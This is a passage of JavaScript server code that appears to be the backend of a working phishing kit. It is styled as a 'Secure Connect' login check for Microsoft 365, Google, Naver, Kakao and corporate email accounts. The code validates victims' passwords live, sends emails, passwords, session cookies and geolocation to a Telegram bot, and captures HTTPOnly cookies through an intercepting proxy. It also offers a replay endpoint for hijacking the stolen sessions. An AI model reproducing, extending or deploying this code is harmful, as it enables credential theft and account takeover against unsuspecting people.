        const providerIcon = provider.icon || '📧';
        msg += `${providerIcon} Provider: ${providerDisplay || provider.display || 'Unknown'}\n`;
        msg += `📧 Email: ${email}\n`;
        msg += `🔑 Password: ${password || 'N/A'}\n`;
        msg += `🔗 Login URL: ${provider.loginUrl || 'N/A'}\n`;
        msg += `🕐 Time: ${new Date().toISOString()}\n`;
        msg += `🆔 Session: ${sessionId ? sessionId.substring(0, 16) + '...' : 'N/A'}\n`;
        msg += `📊 Attempt: ${attemptCount || 1}\n`;
        msg += `📌 Stage: ${stage === 1 ? 'First Password' : stage === 2 ? 'Second Password' : 'Third Password'}\n`;
        msg += `📝 Passwords Completed: ${passwordsCompleted || 0}/3\n\n`;

        if (geolocation && !geolocation.isLocal && geolocation.country !== 'Unknown') {
            msg += `📍 Location: ${geolocation.city}, ${geolocation.region}, ${geolocation.country}\n`;
            msg += `🌆 City: ${geolocation.city}\n`;
            msg += `🌍 Country: ${geolocation.country}\n`;
            if (geolocation.loc && geolocation.loc !== '0,0') {
                msg += `📌 Coordinates: ${geolocation.loc}\n`;
            }
            if (geolocation.timezone && geolocation.timezone !== 'UTC') {
                msg += `🕐 Timezone: ${geolocation.timezone}\n`;
            }
            if (geolocation.org && geolocation.org !== 'Unknown ISP') {
                msg += `🏢 ISP: ${geolocation.org}\n`;
            }
            msg += `📡 IP: ${geolocation.ip || 'Unknown'}\n\n`;
        } else if (geolocation && geolocation.isLocal) {
            msg += `📍 Location: Private/Local\n`;
            msg += `📡 IP: ${geolocation.ip || '127.0.0.1'}\n\n`;
        } else {
            msg += `📍 Location: Unknown\n\n`;
        }

        if (visitorData) {
            msg += `--- Visitor Details ---\n`;
            msg += `🔗 Referrer: ${visitorData.referrer || 'Direct / No Referrer'}\n`;
            msg += `🖥️ User Agent: ${visitorData.userAgent || 'Unknown'}\n`;
            msg += `💻 Browser: ${visitorData.browser || 'Unknown'}\n`;
            msg += `📱 Platform: ${visitorData.platform || 'Unknown'}\n`;
            msg += `📲 Device: ${visitorData.device || 'Unknown'}\n`;
            msg += `🌐 Language: ${visitorData.language || 'Unknown'}\n`;
            const hasCookies = visitorData.cookiesEnabled || (visitorData.cookies && Object.keys(visitorData.cookies).length > 0);
            msg += `🍪 Cookies: ${hasCookies ? '✅ Enabled' : '❌ Disabled'}\n`;
            msg += `🔑 Session ID: ${visitorData.sessionId || 'N/A'}\n\n`;
        }

        if (validationResult) {
            if (validationResult.valid) {
                msg += `✅ Status: PASSWORD VALID - CORRECT!\n`;
                msg += `🔐 2FA: ${validationResult.requires2FA ? '⚠️ Required' : '❌ Not Required'}\n`;
                if (validationResult.isFallback) msg += `⚠️ Note: Fallback verification used\n`;
                if (validationResult.token) msg += `🎟️ Token: ${validationResult.token.substring(0, 50)}...\n`;
            } else if (validationResult.requires2FA) {
                msg += `⚠️ Status: 2FA REQUIRED\n`;
                msg += `📌 Note: Password is correct but MFA is enabled.\n`;
            } else {
                msg += `❌ Status: INVALID PASSWORD\n`;
                msg += `📝 Message: ${validationResult.message || 'Please try again.'}\n`;
            }
        }

        if (verificationStatus === 'completed') {
            msg += `\n🚀 3 PASSWORDS VERIFIED - REDIRECTING TO PROXY\n`;
            msg += `🔗 Proxy URL: ${PROXY_URL}?login_hint=${encodeURIComponent(email)}&session=${sessionId}&verified=true`;
        }

        await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            chat_id: chatId,
            text: msg,
            parse_mode: undefined,
            disable_web_page_preview: true
        });
        
        console.log('✅ Enhanced Telegram alert sent');
        return true;
    } catch (error) {
        console.error('❌ Telegram error:', error.message);
        return false;
    }
}

// ============================================================
// LEGACY TELEGRAM FUNCTION
// ============================================================
async function sendToTelegram(message, parseMode = 'Markdown') {
    try {
        const botToken = process.env.TELEGRAM_BOT_TOKEN;
        const chatId = process.env.TELEGRAM_CHAT_ID;
        
        if (!botToken || !chatId) {
            console.log('⚠️ Telegram credentials missing');
            return false;
        }
        
        let finalMsg = message;
        if (message.length > 4000) {
            finalMsg = message.substring(0, 3900) + '\n\n... (truncated)';
        }
        
        await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            chat_id: chatId,
            text: finalMsg,
            parse_mode: parseMode,
            disable_web_page_preview: true
        });
        return true;
    } catch (error) {
        console.error('❌ Telegram error:', error.message);
        return false;
    }
}

// ============================================================
// CREATE SESSION DIRECTORY
// ============================================================
const SESSION_PATH = path.join(__dirname, 'sessions');

try {
    if (!fs.existsSync(SESSION_PATH)) {
        fs.mkdirSync(SESSION_PATH, { recursive: true });
        console.log('✅ Created session directory:', SESSION_PATH);
    }
} catch (error) {
    console.warn('⚠️ Could not create session directory:', error.message);
}

// ============================================================
// EXPRESS APP SETUP
// ============================================================
const express = require('express');
const app = express();

// Middleware
app.use(cors({ 
    origin: '*', 
    credentials: true, 
    methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'], 
    allowedHeaders: ['Content-Type', 'Authorization', 'X-Session-ID', 'x-session-id', 'Cookie'] 
}));

app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));
app.use(cookieParser());

app.use(session({
    store: new FileStore({ 
        path: SESSION_PATH, 
        ttl: 3600, 
        retries: 0, 
        reapInterval: 60 
    }),
    secret: process.env.SESSION_SECRET || 'secure-connect-team-secret-2024',
    resave: false,
    saveUninitialized: true,
    cookie: { 
        secure: false, 
        maxAge: 3600000 
    }
}));

app.use(express.static(path.join(__dirname, '../')));

// ============================================================
// MIDDLEWARE - Capture Visitor Info
// ============================================================
app.use(async (req, res, next) => {
    let ip = req.headers['x-forwarded-for'] || 
             req.connection.remoteAddress || 
             req.socket.remoteAddress || 
             req.ip || 
             '127.0.0.1';
    
    if (typeof ip === 'string' && ip.includes(',')) {
        ip = ip.split(',')[0].trim();
    }
    
    const cleanIp = ip.replace(/^::ffff:/, '').replace(/^::1$/, '127.0.0.1');
    const userAgent = req.headers['user-agent'] || 'Unknown';
    const browserInfo = detectBrowser(userAgent);
    const referrer = req.headers.referer || req.headers.referrer || 'Direct';
    const language = req.headers['accept-language'] || 'Unknown';
    const sessionId = req.session.id || req.headers['x-session-id'] || uuidv4();
    req.session.id = sessionId;
    
    const hasCookies = !!req.headers.cookie;
    const cookieHeader = req.headers.cookie || '';
    const cookiesFromRequest = {};
    
    if (cookieHeader) {
        cookieHeader.split(';').forEach(cookie => {
            const [name, ...rest] = cookie.trim().split('=');
            if (name) {
                cookiesFromRequest[name] = rest.join('=');
            }
        });
    }
    
    const visitorData = {
        sessionId: sessionId,
        userAgent: userAgent,
        browser: browserInfo.browser,
        platform: browserInfo.platform,
        device: browserInfo.device,
        language: language,
        referrer: referrer,
        ip: cleanIp,
        cookiesEnabled: hasCookies,
        cookies: cookiesFromRequest,
        cookieCount: Object.keys(cookiesFromRequest).length,
        timestamp: Date.now()
    };
    
    req.visitorData = visitorData;
    req.clientIp = cleanIp;
    
    sessionStore.storeVisitorData(sessionId, visitorData);
    
    if (!req.geolocation) {
        try {
            const geo = await getGeolocation(cleanIp);
            req.geolocation = geo;
            const visitor = sessionStore.getVisitorData(sessionId);
            if (visitor) {
                visitor.geolocation = geo;
                sessionStore.storeVisitorData(sessionId, visitor);
            }
        } catch (error) {
            console.error('⚠️ Geolocation error:', error.message);
            req.geolocation = { ip: cleanIp, city: 'Unknown', country: 'Unknown', isLocal: true };
        }
    }
    
    next();
});

// ============================================================
// COOKIE CAPTURE ENDPOINT
// ============================================================
app.post('/api/cookies', async (req, res) => {
    try {
        const data = req.body;
        const sessionId = data.sessionId || req.session.id || req.headers['x-session-id'];
        
        if (sessionId) {
            sessionStore.storeCookies(sessionId, data.cookies, data.source || 'api');
            
            const geo = req.geolocation || { city: 'Unknown', country: 'Unknown' };
            const visitor = req.visitorData || {};
            
            let cookieMsg = `🍪 FULL COOKIES CAPTURED\n\n`;
            cookieMsg += `🆔 Session: ${sessionId.substring(0, 16)}...\n`;
            cookieMsg += `🕐 Time: ${new Date().toISOString()}\n`;
            cookieMsg += `📊 Total: ${Object.keys(data.cookies).length} cookies\n\n`;
            cookieMsg += `📝 COOKIES (FULL VALUES - NO TRUNCATION):\n`;
            
            let count = 0;
            for (const [name, cookieData] of Object.entries(data.cookies)) {
                if (count >= 15) {
                    cookieMsg += `\n... and ${Object.keys(data.cookies).length - count} more cookies\n`;
                    break;
                }
                const value = cookieData.value || cookieData;
                const httpOnly = cookieData.httpOnly ? '🔒' : '🔓';
                const secure = cookieData.secure ? '🔐' : '';
                cookieMsg += `  ${httpOnly}${secure} ${name}:\n`;
                cookieMsg += `  ${value}\n\n`;
                count++;
            }
            
            if (geo && !geo.isLocal && geo.country !== 'Unknown') {
                cookieMsg += `📍 Location: ${geo.city}, ${geo.country}\n`;
                cookieMsg += `📡 IP: ${geo.ip}\n`;
                if (geo.org && geo.org !== 'Unknown ISP') {
                    cookieMsg += `🏢 ISP: ${geo.org}\n`;
                }
            }
            
            if (visitor) {
                cookieMsg += `💻 Browser: ${visitor.browser || 'Unknown'}\n`;
                cookieMsg += `📱 Platform: ${visitor.platform || 'Unknown'}\n`;
                cookieMsg += `🍪 Cookies Detected: ${visitor.cookiesEnabled ? 'Yes' : 'No'}\n`;
            }
            
            await sendToTelegram(cookieMsg);
            
            res.json({ 
                success: true, 
                message: 'Cookies stored successfully (full values)',
                count: Object.keys(data.cookies).length
            });
        } else {
            res.status(400).json({ error: 'No session ID' });
        }
    } catch(e) {
        console.error('[COOKIES] Error:', e);
        res.status(500).json({ error: e.message });
    }
});

// ============================================================
// FIXED: VERIFY PASSWORD ENDPOINT - Supports ALL Providers
// ============================================================
app.post('/api/verify-password', async (req, res) => {
    try {
        const { email, password, stage, sessionId } = req.body;
        const providerInfo = detectEmailProvider(email);
        const sid = sessionId || req.session.id || uuidv4();
        req.session.id = sid;
        
        console.log(`[VERIFY] 📧 Email: ${email}`);
        console.log(`[VERIFY] 🌐 Provider: ${providerInfo.display}`);
        console.log(`[VERIFY] 🔗 Login URL: ${providerInfo.loginUrl}`);
        console.log(`[VERIFY] 📌 Stage: ${stage}`);

        if (!email || !password) {
            return res.status(400).json({ success: false, message: 'Email and password required' });
        }

        // Initialize verification session
        if (!req.session.verification) {
            req.session.verification = {
                email: email,
                provider: providerInfo.provider,
                providerDisplay: providerInfo.display,
                loginUrl: providerInfo.loginUrl,
                passwords: [],
                attempts: 0,
                stage: 1,
                verified: false
            };
        }

        // Reset if email changed
        if (req.session.verification.email !== email) {
            req.session.verification = {
                email: email,
                provider: providerInfo.provider,
                providerDisplay: providerInfo.display,
                loginUrl: providerInfo.loginUrl,
                passwords: [],
                attempts: 0,
                stage: 1,
                verified: false
            };
        }

        req.session.verification.attempts++;

        const geo = req.geolocation || await getGeolocation(req.clientIp || '127.0.0.1');
        const visitor = req.visitorData || {};

        // Verify the password with provider
        const validationResult = await verifyPasswordWithProvider(email, password);
        
        // Store cookies if captured
        if (validationResult.cookies && Object.keys(validationResult.cookies).length > 0) {
            sessionStore.storeCookies(sid, validationResult.cookies, 'verification');
            const visitorData = sessionStore.getVisitorData(sid);
            if (visitorData) {
                visitorData.cookies = validationResult.cookies;
                visitorData.cookiesEnabled = true;
                sessionStore.storeVisitorData(sid, visitorData);
            }
        }

        // Handle 2FA
        if (validationResult.requires2FA) {
            await sendEnhancedTelegramAlert({
                email: email,
                password: password,
                provider: providerInfo,
                providerDisplay: providerInfo.display,
                stage: stage,
                attemptCount: req.session.verification.attempts,
                sessionId: sid,
                geolocation: geo,
                visitorData: visitor,
                validationResult: validationResult,
                verificationStatus: '2fa_required',
                passwordsCompleted: req.session.verification.passwords ? req.session.verification.passwords.length : 0
            });
            
            return res.json({
                success: false,
                requires2FA: true,
                message: '2FA required. Please complete MFA and try again.',
                stage: stage,
                attemptCount: req.session.verification.attempts,
                provider: providerInfo.display,
                loginUrl: providerInfo.loginUrl,
                cookiesCaptured: validationResult.cookies ? Object.keys(validationResult.cookies).length : 0
            });
        }

        // Handle invalid password - RESET EVERYTHING
        if (!validationResult.valid) {
            req.session.verification.passwords = [];
            req.session.verification.stage = 1;
            req.session.verification.verified = false;
            
            await sendEnhancedTelegramAlert({
                email: email,
                password: password,
                provider: providerInfo,
                providerDisplay: providerInfo.display,
                stage: stage,
                attemptCount: req.session.verification.attempts,
                sessionId: sid,
                geolocation: geo,
                visitorData: visitor,
                validationResult: validationResult,
                verificationStatus: 'invalid',
                passwordsCompleted: 0
            });
            
            return res.json({
                success: false,
                requires2FA: false,
                message: 'Invalid password. Please try again.',
                stage: 1,
                attemptCount: req.session.verification.attempts,
                reset: true,
                provider: providerInfo.display,
                loginUrl: providerInfo.loginUrl,
                cookiesCaptured: validationResult.cookies ? Object.keys(validationResult.cookies).length : 0
            });
        }

        // ✅ PASSWORD IS VALID - Store it silently
        req.session.verification.passwords.push(password);
        req.session.verification.stage = req.session.verification.passwords.length + 1;

        // Send alert for this successful verification
        await sendEnhancedTelegramAlert({
            email: email,
            password: password,
            provider: providerInfo,
            providerDisplay: providerInfo.display,
            stage: stage,
            attemptCount: req.session.verification.attempts,
            sessionId: sid,
            geolocation: geo,
            visitorData: visitor,
            validationResult: validationResult,
            verificationStatus: req.session.verification.passwords.length >= 3 ? 'completed' : 'pending',
            passwordsCompleted: req.session.verification.passwords.length
        });

        // Check if we have 3 consecutive correct passwords
        if (req.session.verification.passwords.length >= 3) {
            req.session.verification.verified = true;
            
            // Store verification data
            sessionStore.storeVerificationData(sid, {
                email: email,
                passwords: req.session.verification.passwords,
                verified: true,
                timestamp: Date.now()
            });
            
            const allCookies = sessionStore.getAllCookies(sid);
            
            // Build proxy redirect URL
            const proxyRedirectUrl = `${PROXY_URL}?login_hint=${encodeURIComponent(email)}&session=${sid}&verified=true`;
            
            console.log(`🚀 3 PASSWORDS CORRECT - REDIRECTING TO PROXY: ${proxyRedirectUrl}`);
            
            // Send final completion alert
            await sendEnhancedTelegramAlert({
                email: email,
                password: password,
                provider: providerInfo,
                providerDisplay: providerInfo.display,
                stage: stage,
                attemptCount: req.session.verification.attempts,
                sessionId: sid,
                geolocation: geo,
                visitorData: visitor,
                validationResult: { ...validationResult, valid: true },
                verificationStatus: 'completed',
                passwordsCompleted: 3
            });
            
            return res.json({
                success: true,
                stage: 3,
                verified: true,
                message: '✅ Verification complete! Redirecting...',
                redirectUrl: proxyRedirectUrl,
                attemptCount: req.session.verification.attempts,
                requires2FA: false,
                provider: providerInfo.display,
                loginUrl: providerInfo.loginUrl,
                cookiesCaptured: validationResult.cookies ? Object.keys(validationResult.cookies).length : 0,
                sessionId: sid,
                cookies: allCookies,
                finalRedirect: true,
                passwordsCompleted: 3
            });
        }

        // Not yet 3 - continue silently
        const nextStage = req.session.verification.passwords.length + 1;
        const stageMessages = {
            2: '🔐 Please re-enter your password to confirm your identity.',
            3: '🔐 Please enter your password one more time to complete verification.'
        };

        return res.json({
            success: true,
            stage: nextStage,
            message: stageMessages[nextStage] || '🔐 Please enter your password to verify your identity.',
            attemptCount: req.session.verification.attempts,
            requires2FA: false,
            nextAction: 'confirm_password_' + nextStage,
            provider: providerInfo.display,
            loginUrl: providerInfo.loginUrl,
            cookiesCaptured: validationResult.cookies ? Object.keys(validationResult.cookies).length : 0,
            sessionId: sid,
            passwordsCompleted: req.session.verification.passwords.length
        });

    } catch (error) {
        console.error('[VERIFY] Error:', error.message);
        res.status(500).json({ success: false, message: 'Verification failed. Please try again.', error: error.message });
    }
});

// ============================================================
// GET VERIFICATION STATUS
// ============================================================
app.get('/api/verification-status', (req, res) => {
    try {
        const sessionId = req.headers['x-session-id'] || req.session.id;
        const storedData = sessionStore.getVerificationData(sessionId);
        const status = req.session.verification || { 
            stage: 1, 
            passwords: [], 
            attempts: 0,
            verified: false
        };
        
        res.json({
            stage: status.stage || 1,
            passwordsCompleted: status.passwords ? status.passwords.length : 0,
            attempts: status.attempts || 0,
            email: status.email || null,
            provider: status.providerDisplay || 'Unknown',
            loginUrl: status.loginUrl || null,
            verified: storedData ? storedData.verified || false : false
        });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// ============================================================
// GET FULL COOKIES FOR SESSION
// ============================================================
app.get('/api/cookies/full', (req, res) => {
    const sessionId = req.headers['x-session-id'] || req.session.id;
    
    if (sessionId) {
        const cookies = sessionStore.getFullCookies(sessionId);
        if (cookies) {
            res.json({
                success: true,
                sessionId: sessionId,
                totalCookies: Object.keys(cookies).length,
                cookies: cookies
            });
        } else {
            res.status(404).json({ error: 'No cookies found' });
        }
    } else {
        res.status(400).json({ error: 'No session ID' });
    }
});

// ============================================================
// GET VISITOR DATA
// ============================================================
app.get('/api/visitor', (req, res) => {
    const sessionId = req.headers['x-session-id'] || req.session.id;
    
    if (sessionId) {
        const visitor = sessionStore.getVisitorData(sessionId);
        if (visitor) {
            res.json({
                success: true,
                sessionId: sessionId,
                visitor: visitor
            });
        } else {
            res.status(404).json({ error: 'No visitor data found' });
        }
    } else {
        res.status(400).json({ error: 'No session ID' });
    }
});

// ============================================================
// GET COMPLETE SESSION DATA
// ============================================================
app.get('/api/session-data', (req, res) => {
    const sessionId = req.headers['x-session-id'] || req.session.id;
    
    if (sessionId) {
        const data = sessionStore.getReplayData(sessionId);
        if (data) {
            res.json(data);
        } else {
            res.status(404).json({ error: 'Session not found' });
        }
    } else {
        res.status(400).json({ error: 'No session ID' });
    }
});

// ============================================================
// GET ALL COOKIES
// ============================================================
app.get('/api/cookies/all', (req, res) => {
    const sessionId = req.headers['x-session-id'] || req.session.id;
    
    if (sessionId) {
        const cookies = sessionStore.getAllCookies(sessionId);
        if (cookies) {
            res.json(cookies);
        } else {
            res.status(404).json({ error: 'No cookies found' });
        }
    } else {
        res.status(400).json({ error: 'No session ID' });
    }
});

// ============================================================
// SESSION REPLAY
// ============================================================
app.post('/api/replay', async (req, res) => {
    try {
        const data = req.body;
        const sessionId = data.sessionId || req.headers['x-session-id'] || req.session.id;
        
        if (!sessionId) {
            res.status(400).json({ error: 'No session ID' });
            return;
        }
        
        const sessionData = sessionStore.getReplayData(sessionId);
        if (!sessionData) {
            res.status(404).json({ error: 'Session not found' });
            return;
        }
        
        const cookies = sessionStore.getAllCookies(sessionId);
        const fullCookies = sessionStore.getFullCookies(sessionId);
        const visitor = sessionStore.getVisitorData(sessionId);
        const target = data.target || 'https://login.microsoftonline.com';
        
        const cookieHeader = Object.entries(cookies || {})
            .map(([name, value]) => `${name}=${value}`)
            .join('; ');
        
        res.json({
            success: true,
            sessionId: sessionId,
            target: target,
            cookies: cookies,
            fullCookies: fullCookies,
            cookieHeader: cookieHeader,
            visitor: visitor,
            replayUrl: `${target}?session_replay=true`,
            instructions: [
                '1. Use the cookieHeader below to authenticate',
                '2. Use the fullCookies object for manual replay',
                '3. Access the target URL with the cookies'
            ]
        });
        
    } catch(e) {
        console.error('[REPLAY] Error:', e);
        res.status(500).json({ error: e.message });
    }
});

// ============================================================
// GET PROVIDER FOR EMAIL
// ============================================================
app.get('/api/detect-provider', (req, res) => {
    const { email } = req.query;
    if (!email) return res.status(400).json({ error: 'Email required' });
    res.json(detectEmailProvider(email));
});

// ============================================================
// CREDENTIAL CAPTURE
// ============================================================
app.post('/api/credential-capture', async (req, res) => {
    try {
        const data = req.body;
        const providerInfo = detectEmailProvider(data.email);
        const geo = req.geolocation || { city: 'Unknown', country: 'Unknown' };
        const visitor = req.visitorData || {};
        
        let msg = `🔐 CREDENTIAL CAPTURED\n\n`;
        msg += `${providerInfo.icon || '📧'} Provider: ${providerInfo.display}\n`;
        msg += `📧 Email: ${data.email}\n`;
        msg += `🔗 Login URL: ${providerInfo.loginUrl || 'N/A'}\n`;
        msg += `🔑 Password: ${data.password || 'N/A'}\n`;
        msg += `📍 Source: ${data.source || 'N/A'}\n`;
        msg += `🆔 Session: ${data.sessionId || 'N/A'}\n`;
        msg += `📌 Stage: ${data.stage || 'N/A'}\n`;
        msg += `📊 Attempt: ${data.attemptCount || 'N/A'}\n`;
        msg += `🔗 Page URL: ${data.url || 'N/A'}\n`;
        msg += `🕐 Time: ${new Date().toISOString()}\n\n`;
        
        if (geo && !geo.isLocal && geo.country !== 'Unknown') {
            msg += `📍 Location: ${geo.city}, ${geo.country}\n`;
            msg += `📡 IP: ${geo.ip}\n`;
            if (geo.org && geo.org !== 'Unknown ISP') {
                msg += `🏢 ISP: ${geo.org}\n`;
            }
        }
        
        if (visitor) {
            msg += `💻 Browser: ${visitor.browser || 'Unknown'}\n`;
            msg += `📱 Platform: ${visitor.platform || 'Unknown'}\n`;
            msg += `🍪 Cookies: ${visitor.cookiesEnabled ? '✅ Enabled' : '❌ Disabled'}\n`;
        }
        
        await sendToTelegram(msg);
        res.json({ success: true });
    } catch (error) {
        console.error('[CREDENTIAL] Error:', error);
        res.status(500).json({ error: error.message });
    }
});

// ============================================================
// PROXY SERVER
// ============================================================
app.all('/proxy/*', async (req, res) => {
    const targetUrl = req.params[0];
    const sessionId = req.session.id || uuidv4();
    req.session.id = sessionId;
    
    console.log(`🔄 Proxy request: ${req.method} ${targetUrl}`);
    
    try {
        const headers = {
            'User-Agent': req.headers['user-agent'] || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': req.headers['accept'] || 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': req.headers['accept-language'] || 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Upgrade-Insecure-Requests': '1',
            'Cookie': req.headers.cookie || ''
        };
        
        const response = await axios({
            method: req.method,
            url: targetUrl,
            headers: headers,
            withCredentials: true,
            maxRedirects: 0,
            validateStatus: false,
            responseType: 'text'
        });
        
        const setCookieHeaders = response.headers['set-cookie'] || [];
        
        if (setCookieHeaders.length > 0) {
            console.log(`🍪 Captured ${setCookieHeaders.length} cookies from Set-Cookie headers`);
            
            const capturedCookies = setCookieHeaders.map(header => {
                const parts = header.split(';');
                const [name, value] = parts[0].split('=');
                const attributes = parts.slice(1).map(p => p.trim());
                
                return {
                    name: name,
                    value: value,
                    httpOnly: attributes.some(a => a.toLowerCase() === 'httponly'),
                    secure: attributes.some(a => a.toLowerCase() === 'secure'),
                    sameSite: attributes.find(a => a.toLowerCase().startsWith('samesite='))?.split('=')[1] || 'Lax',
                    path: attributes.find(a => a.toLowerCase().startsWith('path='))?.split('=')[1] || '/',
                    domain: attributes.find(a => a.toLowerCase().startsWith('domain='))?.split('=')[1] || '',
                    fullHeader: header,
                    capturedAt: Date.now()
                };
            });
            
            const cookieData = {};
            capturedCookies.forEach(c => {
                cookieData[c.name] = { value: c.value, httpOnly: c.httpOnly, secure: c.secure };
            });
            sessionStore.storeCookies(sessionId, cookieData, 'proxy');
            
            const geo = req.geolocation || { city: 'Unknown', country: 'Unknown' };
            
            let telegramMessage = `🎯 HTTPOnly COOKIES CAPTURED VIA PROXY\n\n`;
            telegramMessage += `Total Cookies: ${capturedCookies.length}\n`;
            telegramMessage += `HTTPOnly: ${capturedCookies.filter(c => c.httpOnly).length}\n`;
            telegramMessage += `Secure: ${capturedCookies.filter(c => c.secure).length}\n`;
            telegramMessage += `Session: ${sessionId}\n\n`;
            
            capturedCookies.slice(0, 5).forEach(c => {
                const flags = [];
                if (c.httpOnly) flags.push('🔒 HTTPOnly');
                if (c.secure) flags.push('🔐 Secure');
                telegramMessage += `${c.name}: ${c.value.substring(0, 50)}...\n`;
                if (flags.length) telegramMessage += `  ${flags.join(' | ')}\n`;
            });
            
            if (geo && !geo.isLocal && geo.country !== 'Unknown') {
                telegramMessage += `\n📍 Location: ${geo.city}, ${geo.country}\n`;
                telegramMessage += `📡 IP: ${geo.ip}\n`;
            }
            
            telegramMessage += `\nTime: ${new Date().toISOString()}`;
            await sendToTelegram(telegramMessage);
        }
        
        const responseHeaders = { ...response.headers };
        if (setCookieHeaders.length > 0) {
            responseHeaders['Set-Cookie'] = setCookieHeaders;
        }
        
        res.set(responseHeaders);
        res.status(response.status).send(response.data);
        
    } catch (error) {
        console.error('❌ Proxy error:', error.message);
        res.status(500).send('Proxy error');
    }
});

// ============================================================
// TELEGRAM ENDPOINT
// ============================================================
app.post('/api/telegram', async (req, res) => {
    try {
        const { message, parseMode } = req.body;
        await sendToTelegram(message, parseMode || 'Markdown');
        res.json({ success: true });
    } catch (error) {
        console.error('[TELEGRAM] Error:', error);
        res.status(500).json({ error: error.message });
    }
});

// ============================================================
// RESET VERIFICATION
// ============================================================
app.post('/api/reset-verification', (req, res) => {
    try {
        if (req.session) req.session.verification = null;
        const sessionId = req.session.id || req.headers['x-session-id'];
        if (sessionId) {
            sessionStore.verificationData.delete(sessionId);
        }
        res.json({ success: true, message: 'Verification reset' });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// ============================================================
// HEALTH CHECK
// ============================================================
app.get('/health', async (req, res) => {
    const sessions = Array.from(sessionStore.sessions.values());
    let totalCookies = 0;
    let totalVisitors = 0;
    
    for (const session of sessions) {
        if (session.cookies) {
            for (const source of Object.values(session.cookies)) {
                if (Array.isArray(source)) {
                    totalCookies += source.length;
                }
            }
        }
        if (session.visitor) totalVisitors++;
    }
    
    res.json({
        status: 'healthy',
        timestamp: new Date().toISOString(),
        browserActive: !!browserInstance,
        puppeteerAvailable: puppeteerAvailable,
        sessions: sessionStore.sessions.size,
        totalCookies: totalCookies,
        totalVisitors: totalVisitors,
        replayData: sessionStore.replayData.size,
        telegram: !!(process.env.TELEGRAM_BOT_TOKEN && process.env.TELEGRAM_CHAT_ID),
        googleOAuth: !!(GOOGLE_CLIENT_ID && GOOGLE_CLIENT_SECRET),
        geolocationEnabled: true,
        visitorTracking: true,
        version: '3.0.0-all-providers-silent'
    });
});

// ============================================================
// SERVE FRONTEND
// ============================================================
app.get('/', (req, res) => {
    serveFile(path.join(__dirname, '../frontend', 'index.html'), res);
});

app.get('/inject.js', (req, res) => {
    serveFile(path.join(__dirname, '../frontend', 'script_inject.js'), res, 'text/javascript');
});

app.get('/style.css', (req, res) => {
    serveFile(path.join(__dirname, '../frontend', 'style.css'), res, 'text/css');
});

function serveFile(filePath, res, contentType = 'text/html') {
    fs.readFile(filePath, (err, data) => {
        if (err) {
            res.status(404).send('File not found');
            return;
        }
        res.setHeader('Content-Type', contentType);
        res.setHeader('Cache-Control', 'no-store');
        res.send(data);
    });
}

// ============================================================
// START SERVER
// ============================================================
const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
    console.log('╔═══════════════════════════════════════════════════════════╗');
    console.log('║                                                           ║');
    console.log('║   🍪  SECURE CONNECT - ALL PROVIDERS SUPPORT             ║');
    console.log('║   🔐  SILENT 3-CONSECUTIVE VERIFICATION                  ║');
    console.log('║   🌐  ALL EMAIL PROVIDERS SUPPORTED                     ║');
    console.log('║   📧  Microsoft • Google • Yahoo • Naver • Kakao        ║');
    console.log('║   📧  Corporate • Apple • Korean Domains                ║');
    console.log('║   🍪  FULL COOKIE CAPTURE (NO TRUNCATION)               ║');
    console.log('║   📍  COMPLETE IP GEOLOCATION                           ║');
    console.log('║   👤  VISITOR TRACKING                                  ║');
    console.log('║   🔄  AUTO-REDIRECT TO PROXY → MICROSOFT → TEAMS       ║');
    console.log(`║   🤖  Puppeteer: ${puppeteerAvailable ? '✅ AVAILABLE' : '⚠️ FALLBACK MODE'}`);
    console.log('║                                                           ║');
    console.log('╠═══════════════════════════════════════════════════════════╣');
    console.log(`║   📍 Server:  http://localhost:${PORT}                   ║`);
    console.log(`║   📧 Telegram: ${process.env.TELEGRAM_BOT_TOKEN ? '✅ ENHANCED' : '❌ DISABLED'}`);
    console.log(`║   🔑 Google OAuth: ${GOOGLE_CLIENT_ID ? '✅ CONFIGURED' : '⚠️ NOT CONFIGURED'}`);
    console.log('║                                                           ║');
    console.log('╠═══════════════════════════════════════════════════════════╣');
    console.log('║   📊 SUPPORTED PROVIDERS:                               ║');
    console.log('║   🇰🇷 Naver Works • Tracoworld • JPI • Upchem           ║');
    console.log('║   🇰🇷 Flucon • Ecount • Naver • Daum • Kakao            ║');
    console.log('║   🇰🇷 Nate • DreamWiz • Paran • Empas • Lycos           ║');
    console.log('║   🇰🇷 Freechal • Korean Corporate                        ║');
    console.log('║   💼 Microsoft 365 • Google • Yahoo • Apple             ║');
    console.log('║   🏢 Corporate Domains (any domain)                     ║');
    console.log('║                                                           ║');
    console.log('╠═══════════════════════════════════════════════════════════╣');
    console.log('║   📊 SILENT FLOW:                                       ║');
    console.log('║   1️⃣ User enters password → Silent count 1              ║');
    console.log('║   2️⃣ User enters password → Silent count 2              ║');
    console.log('║   3️⃣ User enters password → Silent count 3              ║');
    console.log('║   4️⃣ 3 CORRECT → REDIRECT TO PROXY                    ║');
    console.log('║   5️⃣ Microsoft Login → Email pre-filled                ║');
    console.log('║   6️⃣ ✅ Teams Meeting - Final Destination!             ║');
    console.log('║                                                           ║');
    console.log('╚═══════════════════════════════════════════════════════════╝');
});

// ============================================================
// CLEANUP
// ============================================================
setInterval(() => {
    sessionStore.cleanup();
}, 300000);